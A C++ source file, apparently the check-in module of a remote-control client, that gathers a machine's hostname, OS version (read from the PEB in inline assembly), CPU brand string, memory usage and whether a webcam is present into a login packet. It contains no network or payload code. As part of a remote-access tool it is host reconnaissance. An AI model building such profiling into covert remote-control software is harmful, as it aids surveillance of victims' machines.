#include "pch.h"
#include "Login.h"


VOID GetLoginInfo(PBYTE pbLoginPacketBody) {
	LOGIN_INFO LoginInfo;
	ZeroMemory(&LoginInfo, sizeof(LOGIN_INFO));

	gethostname(LoginInfo.HostName, 50);
	GetOSVersion(LoginInfo.OsVersion, 30);
	GetCpuType(LoginInfo.CpuType, 80);
	GetMemoryInfo(LoginInfo.MemoryInfo, 30);
	LoginInfo.bHaveCamera = HaveCamera();
	
	LoginInfo.StructToBuffer(pbLoginPacketBody);
}



// 是否有摄像头
BOOL HaveCamera()
{
	BOOL	bRet = false;
	WCHAR	lpszName[100], lpszVer[50];
	for (int i = 0; i < 10 && !bRet; i++)
	{
		bRet = capGetDriverDescription(i, lpszName, sizeof(lpszName), lpszVer, sizeof(lpszVer));
	}
	return bRet;
}




// ---- get cpu info ---- //  
// save 4 register variables  
DWORD deax;
DWORD debx;
DWORD decx;
DWORD dedx;

// init cpu in assembly language  
void initCpu(DWORD veax)
{
	__asm
	{
		mov eax, veax
		cpuid
		mov deax, eax
		mov debx, ebx
		mov decx, ecx
		mov dedx, edx
	}
}

// CPU类型，形如Intel(R) Core(TM) i7-10875H CPU @ 2.30GHz
VOID GetCpuType(CHAR* lpszCpuType, DWORD dwBufferSize)
{
	const DWORD id = 0x80000002; // start 0x80000002 end to 0x80000004  
	char cpuType[49];
	memset(cpuType, 0, sizeof(cpuType));

	for (DWORD t = 0; t < 3; t++)
	{
		initCpu(id + t);

		memcpy(cpuType + 16 * t + 0, &deax, 4);
		memcpy(cpuType + 16 * t + 4, &debx, 4);
		memcpy(cpuType + 16 * t + 8, &decx, 4);
		memcpy(cpuType + 16 * t + 12, &dedx, 4);
	}

	strcpy_s(lpszCpuType, dwBufferSize, cpuType);
}



// 获取操作系统版本号
VOID GetOSVersion(CHAR* lpszOsVersion, DWORD dwBufferSize)
{
	DWORD Minor, Major, Build;
	_asm
	{
		pushad
		mov ebx, fs:[0x18]; get self pointer from TEB
		mov eax, fs:[0x30]; get pointer to PEB / database
		mov ebx, [eax + 0A8h]; get OSMinorVersion
		mov eax, [eax + 0A4h]; get OSMajorVersion
		mov Minor, ebx
		mov Major, eax
		popad
	}
	Build = 0;


	if (Major == 5 && Minor == 0) {
		strcpy_s(lpszOsVersion, dwBufferSize, "Windows 2000");
	}
	else if (Major == 5 && Minor == 1){
		strcpy_s(lpszOsVersion, dwBufferSize, "Windows XP");
	}
	else if (Major == 5 && Minor == 2) {
		strcpy_s(lpszOsVersion, dwBufferSize, "Windows 2003");
	}
	else if (Major == 6 && Minor == 0) {
		strcpy_s(lpszOsVersion, dwBufferSize, "Windows Vista");
	}
	else if (Major == 6 && Minor == 1) {
		strcpy_s(lpszOsVersion, dwBufferSize, "Windows 7");
	}
	else if (Major == 6 && Minor == 2) {
		strcpy_s(lpszOsVersion, dwBufferSize, "Windows 8");
	}
	else if (Major == 6 && Minor == 3) {
		strcpy_s(lpszOsVersion, dwBufferSize, "Windows 8.1");
	}
	else if (Major == 10 && Minor == 0) {
		strcpy_s(lpszOsVersion, dwBufferSize, "Windows 10");
	}

	// 5.0 Windows 2000";
	// 5.1 Windows XP";
	// 5.2 Windows 2003";
	// 6.0 Windows Vista";
	// 6.1 Windows 7";
	// 6.2 Windows 8";
	// 6.3 Windows 8.1";
	// 10.0 Windows 10";
	//其他版本
}




#define  GBYTES  1073741824    
#define  MBYTES  1048576    
#define  KBYTES  1024    
#define  DKBYTES 1024.0    

// 获取内存信息，返回字符串。
VOID GetMemoryInfo(CHAR* lpszMemoryInfo, size_t dwBufferSize)
{
	MEMORYSTATUSEX statusex;
	statusex.dwLength = sizeof(statusex);
	if (GlobalMemoryStatusEx(&statusex))
	{
		unsigned long long total = 0, remain_total = 0, avl = 0, remain_avl = 0;
		double decimal_total = 0, decimal_avl = 0;
		remain_total = statusex.ullTotalPhys % GBYTES;
		total = statusex.ullTotalPhys / GBYTES;
		avl = statusex.ullAvailPhys / GBYTES;
		remain_avl = statusex.ullAvailPhys % GBYTES;
		if (remain_total > 0)
			decimal_total = (remain_total / MBYTES) / DKBYTES;
		if (remain_avl > 0)
			decimal_avl = (remain_avl / MBYTES) / DKBYTES;

		decimal_total += (double)total;
		decimal_avl += (double)avl;
		
		sprintf_s(lpszMemoryInfo, dwBufferSize, "%.2fGB/%.2fGB", decimal_avl, decimal_total);
	}
}